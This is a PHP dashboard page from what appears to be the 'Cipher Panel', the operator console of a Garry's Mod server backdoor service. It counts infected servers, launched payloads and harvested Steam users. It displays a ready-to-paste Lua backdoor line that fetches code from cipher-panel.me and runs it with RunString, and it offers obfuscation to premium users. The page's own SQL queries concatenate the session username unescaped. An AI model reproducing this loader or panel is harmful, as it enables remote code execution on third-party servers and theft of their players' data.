<?php
session_start();  
if(!isset($_SESSION["username"]))  
{  
      die(header("location:../login.php"));  
} 
include "../inc/eldb.php";

$ifban = "SELECT ban FROM users WHERE uname = '".$_SESSION["username"]."'";
if($result = mysqli_query($db, $ifban)){
    if(mysqli_num_rows($result) > 0){
        while($row = mysqli_fetch_array($result)){
            if ($row["ban"] == 1){
                die(header("location: ../confirm.php?confirm=false"));
            }
        }
    }
}

$ifconfirm = "SELECT * FROM users WHERE uname = '".$_SESSION["username"]."'";
if($result = mysqli_query($db, $ifconfirm)){
    if(mysqli_num_rows($result) > 0){
        while($row = mysqli_fetch_array($result)){
        	if ($row["confirm"] == 0){
        		die(header("location: ../confirm.php?usr=".$_SESSION["username"]."&to=".$row["token"]));
        	}elseif ($row["confirm"] == 2){
        		die(header("location: ../confirm.php?confirm=false"));
        	}
        }
    }
}


?>

<!DOCTYPE html>
<html lang="en">


<!-- Cipher Panel - Author : exit - Free Access Version -->
<head>
  <meta charset="utf-8" />
  <link rel="apple-touch-icon" sizes="76x76" href="../assets/img/cipher.png">
  <link rel="icon" type="image/png" href="../assets/img/favicon.png">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
  <title>
    Dashboard
  </title>
  <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no' name='viewport' />
  <!--     Fonts and icons     -->
  <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:400,700|Material+Icons" />
  <link rel="stylesheet" href="../../../maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
  <!-- CSS Files -->
    <script src="https://kit.fontawesome.com/647923b639.js"></script>
  <link href="../assets/css/material-dashboard.minf066.css?v=2.1.0" rel="stylesheet" />
</head>
<body class="">
  <div class="wrapper ">
<?php include '../inc/sidebar.php'; ?>
    <div class="main-panel">
      <!-- Navbar -->
      <?php include '../inc/navbar.php'; ?>
      <!-- End Navbar -->
      <div class="content">
        <div class="content">
          <div class="container-fluid">
                        <div class="row">
                          <div class="col-lg-3 col-md-6 col-sm-6">
                            <div class="card card-stats">
                              <div class="card-header card-header-warning card-header-icon">
                                <div class="card-icon">
                                  <i class="fas fa-server"></i>
                                </div>
                                <p class="card-category">Serveurs en ligne</p>
                                <h3 class="card-title"><? 
                    $getuser = "SELECT * FROM users WHERE uname = '".$_SESSION["username"]."'";
                    if($resultu = mysqli_query($db, $getuser)){
                        if(mysqli_num_rows($resultu) > 0){ 
                          while($rowuser = mysqli_fetch_array($resultu)){
                    $count = 0;
                    if ($rowuser["rank"] == 1){
                    $countservon = "SELECT lupdate FROM servers WHERE token = '".$rowuser["token"]."'";
                  }else{
                    $countservon = "SELECT lupdate FROM servers";
                  }
                      if($result = mysqli_query($db, $countservon)){
                        if(mysqli_num_rows($result) > 0){
                          while($row = mysqli_fetch_array($result)){
                            if ($row["lupdate"] + 60 > time()){
                              $count = $count + 1;
                            }
                          }
                        }
                      }else{echo "Erreur";
                    }
                }
            }
        }
                     echo $count; ?></h3>
                              </div>
                              <div class="card-footer">
                                <div class="stats">
                                   <? if ($count < 5){ ?>
                    <i class="material-icons text-warning">warning</i>
                    <a class="warning-link">C'est très peu :(</a>
                  <? }else{ ?>
                    <a class="success-link">:)</a>
                  <? } ?>
                                </div>
                              </div>
                            </div>
                          </div>
                          <div class="col-lg-3 col-md-6 col-sm-6">
                            <div class="card card-stats">
                              <div class="card-header card-header-success card-header-icon">
                                <div class="card-icon">
                                  <i class="fas fa-hdd"></i>
                                </div>
                                <p class="card-category">Serveurs enregistrés</p>
                                <h3 class="card-title"><?
                  if ($rowuser["rank"] == 1){
                  $countserven = $db->query("SELECT * FROM servers WHERE token = '".$rowuser["token"]."'"); 
                  }else{
                    $countserven = $db->query("SELECT * FROM servers"); }
                  $finalc = $countserven->num_rows;
                  echo $finalc;
                  ?></h3>
                              </div>
                              <div class="card-footer">
                                <div class="stats">
                                 <i class="material-icons">date_range</i> Dont <? $dont = $finalc - $count;
                    echo $dont;
                    ?> serveurs hors-ligne
                                </div>
                              </div>
                            </div>
                          </div>
                          <div class="col-lg-3 col-md-6 col-sm-6">
                            <div class="card card-stats">
                              <div class="card-header card-header-danger card-header-icon">
                                <div class="card-icon">
                                 <i class="fas fa-rocket"></i>
                                </div>
                                <p class="card-category">Payloads lancés</p>
                                <h3 class="card-title"><? $countpay = "SELECT stat FROM stats WHERE name = 'payloads'"; 
                  if($resultqq = mysqli_query($db, $countpay)){
                        if(mysqli_num_rows($resultqq) > 0){
                          while($rowaa = mysqli_fetch_array($resultqq)){
                  echo $rowaa["stat"];
                    }
                }
            }
                  ?></h3>
                              </div>
                              <div class="card-footer">
                                <div class="stats">
                                  <i class="fas fa-bomb"></i> FEU ! FEU ☭
                                </div>
                              </div>
                            </div>
                          </div>
                          <div class="col-lg-3 col-md-6 col-sm-6">
                            <div class="card card-stats">
                              <div class="card-header card-header-info card-header-icon">
                                <div class="card-icon">
                                  <i class="fas fa-user-secret"></i>
                                </div>
                                <p class="card-category">Utilisateurs récupérés</p>
                                <h3 class="card-title"><?$countmemb = $db->query("SELECT * FROM steamusers"); 
                  $finalm = $countmemb->num_rows;
                  echo $finalm;
                  ?></h3>
                              </div>
                              <div class="card-footer">
                                <div class="stats">
                                  <i class="material-icons">update</i> Data mise à jour il y a un instant
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      <div class="col-md-12">
              <div class="card ">
              	<? 
                   $getuser = "SELECT * FROM users WHERE uname = '".$_SESSION["username"]."'";
                    if($resultu = mysqli_query($db, $getuser)){
                        if(mysqli_num_rows($resultu) > 0){ 
                          while($rowuser = mysqli_fetch_array($resultu)){ ?>
              	<? if ($rowuser['rank'] == 2 or $rowuser['rank'] == 3){ ?> 
                <div class="card-header card-header-warning card-header-text">
                <? }else{ ?>
                	<div class="card-header card-header-not card-header-text">
                <? } ?>
                  <div class="card-text">
                    <h4 class="card-title">Backdoor</h4>
                  </div>
                </div>
                <div class="card-body ">
                  <form class="form-horizontal">
                    <div class="row">
                    	<? if ($rowuser['rank'] == 2 or $rowuser['rank'] == 3){ ?> 
                      <label class="col-sm-2 text-warning col-form-label">Backdoor</label>
                  <? }else{
                  	?>  <label class="col-sm-2 col-form-label">Backdoor</label> <?
                  } ?>
                      <div class="col-sm-10">
                        <div class="form-group">
                          <input type="text" class="form-control" value="timer.Simple(1, function() http.Fetch('https://cipher-panel.me/secure_area/flg.php?server&to=<? echo $rowuser['backdoor']; ?>', function(body) RunString(fck, 'BillIsHere', false) end) end)" disabled>
                        </div>
                      </div>
                    </div>
                    <div class="row">
                    	<? if ($rowuser['rank'] == 2 or $rowuser['rank'] == 3){ ?> 
                      <label class="col-sm-2 col-form-label text-warning label-checkbox">Obfuscation</label>
                      <div class="col-sm-10 checkbox-radios">
                        <div class="form-check">
                        		<label class="form-check-label">
                            <input class="form-check-input" type="checkbox" value="" checked disabled> (activée)
                            <span class="form-check-sign">
                              <span class="check"></span>
                            </span>
                          </label> <?
                        	}else{ ?> 
                        		 <label class="col-sm-2 col-form-label label-checkbox">Obfuscation</label>
                      <div class="col-sm-10 checkbox-radios">
                        <div class="form-check">
                          <label class="form-check-label">
                            <input class="form-check-input" type="checkbox" value="" disabled> (premium uniquement)
                            <span class="form-check-sign">
                              <span class="check"></span>
                            </span>
                          </label>
                          <? }
                           }
                  			}
             			 } ?>
                        </div>
                      </div>
                    </div>
                  </form>
                </div>
              </div>
            </div>

 <? include '../inc/footer.php'; ?>
              <!--   Core JS Files   -->
              <script src="../assets/js/core/jquery.min.js"></script>
              <script src="../assets/js/core/popper.min.js"></script>
              <script src="../assets/js/core/bootstrap-material-design.min.js"></script>
              <script src="../assets/js/plugins/perfect-scrollbar.jquery.min.js"></script>
              <!-- Plugin for the momentJs  -->
              <script src="../assets/js/plugins/moment.min.js"></script>
              <!--  Plugin for Sweet Alert -->
              <script src="../assets/js/plugins/sweetalert2.js"></script>
              <!-- Forms Validations Plugin -->
              <script src="../assets/js/plugins/jquery.validate.min.js"></script>
              <!-- Plugin for the Wizard, full documentation here: https://github.com/VinceG/twitter-bootstrap-wizard -->
              <script src="../assets/js/plugins/jquery.bootstrap-wizard.js"></script>
              <!--	Plugin for Select, full documentation here: http://silviomoreto.github.io/bootstrap-select -->
              <script src="../assets/js/plugins/bootstrap-selectpicker.js"></script>
              <!--  Plugin for the DateTimePicker, full documentation here: https://eonasdan.github.io/bootstrap-datetimepicker/ -->
              <script src="../assets/js/plugins/bootstrap-datetimepicker.min.js"></script>
              <!--  DataTables.net Plugin, full documentation here: https://datatables.net/  -->
              <script src="../assets/js/plugins/jquery.dataTables.min.js"></script>
              <!--	Plugin for Tags, full documentation here: https://github.com/bootstrap-tagsinput/bootstrap-tagsinputs  -->
              <script src="../assets/js/plugins/bootstrap-tagsinput.js"></script>
              <!-- Plugin for Fileupload, full documentation here: http://www.jasny.net/bootstrap/javascript/#fileinput -->
              <script src="../assets/js/plugins/jasny-bootstrap.min.js"></script>
              <!--  Full Calendar Plugin, full documentation here: https://github.com/fullcalendar/fullcalendar    -->
              <script src="../assets/js/plugins/fullcalendar.min.js"></script>
              <!-- Vector Map plugin, full documentation here: http://jvectormap.com/documentation/ -->
              <script src="../assets/js/plugins/jquery-jvectormap.js"></script>
              <!--  Plugin for the Sliders, full documentation here: http://refreshless.com/nouislider/ -->
              <script src="../assets/js/plugins/nouislider.min.js"></script>
              <!-- Include a polyfill for ES6 Promises (optional) for IE11, UC Browser and Android browser support SweetAlert -->
              <script src="../../../cdnjs.cloudflare.com/ajax/libs/core-js/2.4.1/core.js"></script>
              <!-- Library for adding dinamically elements -->
              <script src="../assets/js/plugins/arrive.min.js"></script>
              <!--  Google Maps Plugin    -->
              <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyB2Yno10-YTnLjjn_Vtk0V8cdcY5lC4plU"></script>
              <!-- Place this tag in your head or just before your close body tag. -->
              <script async defer src="../../../buttons.github.io/buttons.js"></script>
              <!-- Chartist JS -->
              <script src="../assets/js/plugins/chartist.min.js"></script>
              <!--  Notifications Plugin    -->
              <script src="../assets/js/plugins/bootstrap-notify.js"></script>
              <!-- Control Center for Material Dashboard: parallax effects, scripts for the example pages etc -->
              <script src="../assets/js/material-dashboard.minf066.js?v=2.1.0" type="text/javascript"></script>
              <script>
                $(document).ready(function() {
                  $().ready(function() {
                    $sidebar = $('.sidebar');

                    $sidebar_img_container = $sidebar.find('.sidebar-background');

                    $full_page = $('.full-page');

                    $sidebar_responsive = $('body > .navbar-collapse');

                    window_width = $(window).width();

                    fixed_plugin_open = $('.sidebar .sidebar-wrapper .nav li.active a p').html();

                    if (window_width > 767 && fixed_plugin_open == 'Dashboard') {
                      if ($('.fixed-plugin .dropdown').hasClass('show-dropdown')) {
                        $('.fixed-plugin .dropdown').addClass('open');
                      }

                    }

                    $('.fixed-plugin a').click(function(event) {
                      // Alex if we click on switch, stop propagation of the event, so the dropdown will not be hide, otherwise we set the  section active
                      if ($(this).hasClass('switch-trigger')) {
                        if (event.stopPropagation) {
                          event.stopPropagation();
                        } else if (window.event) {
                          window.event.cancelBubble = true;
                        }
                      }
                    });

                    $('.fixed-plugin .active-color span').click(function() {
                      $full_page_background = $('.full-page-background');

                      $(this).siblings().removeClass('active');
                      $(this).addClass('active');

                      var new_color = $(this).data('color');

                      if ($sidebar.length != 0) {
                        $sidebar.attr('data-color', new_color);
                      }

                      if ($full_page.length != 0) {
                        $full_page.attr('filter-color', new_color);
                      }

                      if ($sidebar_responsive.length != 0) {
                        $sidebar_responsive.attr('data-color', new_color);
                      }
                    });

                    $('.fixed-plugin .background-color .badge').click(function() {
                      $(this).siblings().removeClass('active');
                      $(this).addClass('active');

                      var new_color = $(this).data('background-color');

                      if ($sidebar.length != 0) {
                        $sidebar.attr('data-background-color', new_color);
                      }
                    });

                    $('.fixed-plugin .img-holder').click(function() {
                      $full_page_background = $('.full-page-background');

                      $(this).parent('li').siblings().removeClass('active');
                      $(this).parent('li').addClass('active');


                      var new_image = $(this).find("img").attr('src');

                      if ($sidebar_img_container.length != 0 && $('.switch-sidebar-image input:checked').length != 0) {
                        $sidebar_img_container.fadeOut('fast', function() {
                          $sidebar_img_container.css('background-image', 'url("' + new_image + '")');
                          $sidebar_img_container.fadeIn('fast');
                        });
                      }

                      if ($full_page_background.length != 0 && $('.switch-sidebar-image input:checked').length != 0) {
                        var new_image_full_page = $('.fixed-plugin li.active .img-holder').find('img').data('src');

                        $full_page_background.fadeOut('fast', function() {
                          $full_page_background.css('background-image', 'url("' + new_image_full_page + '")');
                          $full_page_background.fadeIn('fast');
                        });
                      }

                      if ($('.switch-sidebar-image input:checked').length == 0) {
                        var new_image = $('.fixed-plugin li.active .img-holder').find("img").attr('src');
                        var new_image_full_page = $('.fixed-plugin li.active .img-holder').find('img').data('src');

                        $sidebar_img_container.css('background-image', 'url("' + new_image + '")');
                        $full_page_background.css('background-image', 'url("' + new_image_full_page + '")');
                      }

                      if ($sidebar_responsive.length != 0) {
                        $sidebar_responsive.css('background-image', 'url("' + new_image + '")');
                      }
                    });

                    $('.switch-sidebar-image input').change(function() {
                      $full_page_background = $('.full-page-background');

                      $input = $(this);

                      if ($input.is(':checked')) {
                        if ($sidebar_img_container.length != 0) {
                          $sidebar_img_container.fadeIn('fast');
                          $sidebar.attr('data-image', '#');
                        }

                        if ($full_page_background.length != 0) {
                          $full_page_background.fadeIn('fast');
                          $full_page.attr('data-image', '#');
                        }

                        background_image = true;
                      } else {
                        if ($sidebar_img_container.length != 0) {
                          $sidebar.removeAttr('data-image');
                          $sidebar_img_container.fadeOut('fast');
                        }

                        if ($full_page_background.length != 0) {
                          $full_page.removeAttr('data-image', '#');
                          $full_page_background.fadeOut('fast');
                        }

                        background_image = false;
                      }
                    });

                    $('.switch-sidebar-mini input').change(function() {
                      $body = $('body');

                      $input = $(this);

                      if (md.misc.sidebar_mini_active == true) {
                        $('body').removeClass('sidebar-mini');
                        md.misc.sidebar_mini_active = false;

                        $('.sidebar .sidebar-wrapper, .main-panel').perfectScrollbar();

                      } else {

                        $('.sidebar .sidebar-wrapper, .main-panel').perfectScrollbar('destroy');

                        setTimeout(function() {
                          $('body').addClass('sidebar-mini');

                          md.misc.sidebar_mini_active = true;
                        }, 300);
                      }

                      // we simulate the window Resize so the charts will get updated in realtime.
                      var simulateWindowResize = setInterval(function() {
                        window.dispatchEvent(new Event('resize'));
                      }, 180);

                      // we stop the simulation of Window Resize after the animations are completed
                      setTimeout(function() {
                        clearInterval(simulateWindowResize);
                      }, 1000);

                    });
                  });
                });
              </script>
</body>
<!-- Cipher Panel - Author : exit - Free Access Version -->
</html>
